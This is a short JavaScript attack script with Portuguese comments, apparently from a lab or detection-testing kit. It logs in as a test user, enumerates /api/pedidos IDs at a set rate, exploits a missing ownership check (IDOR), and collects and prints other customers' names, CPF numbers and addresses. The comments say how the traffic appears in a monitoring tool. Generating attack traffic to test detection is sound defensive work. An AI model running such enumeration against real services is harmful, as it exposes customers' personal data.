// npm run ataque:idor: logada como "bia", percorre /api/pedidos/1, 2, 3…
// A API não confere o dono do pedido, então vaza nome, CPF, endereço e
// final do cartão de todos os clientes. No Omni aparece como muitas
// requisições em /api/pedidos/:id da mesma conta, com 404 no fim da lista.
//   --conta bia --senha bia123
//   --ate 250     último id tentado
//   --taxa 20

import { args, basic, flood, send } from '../lib.js'

const o = args({ conta: 'bia', senha: 'bia123', ate: 250, taxa: 20 })
const auth = basic(o.conta, o.senha)
const ip = '198.51.100.77'
const vazados = new Map()

console.log(`IDOR: ${o.conta} lendo os pedidos 1 a ${o.ate}.`)
await flood({
  name: 'idor',
  rate: o.taxa,
  duration: 0,
  next: (i) => (i < o.ate ? send(`/api/pedidos/${i + 1}`, { ip, auth }) : null),
  onResult: (r) => {
    if (r.status === 200 && r.data.email !== `${o.conta}@exemplo.com`) {
      const c = vazados.get(r.data.cpf) || { nome: r.data.cliente, cpf: r.data.cpf, endereco: r.data.endereco, pedidos: 0 }
      c.pedidos++
      vazados.set(r.data.cpf, c)
    }
  },
})
console.log(`\ndados de ${vazados.size} outros clientes vazados:`)
for (const c of vazados.values()) console.log(`  ${c.nome}  CPF ${c.cpf}  ${c.endereco}  (${c.pedidos} pedidos)`)
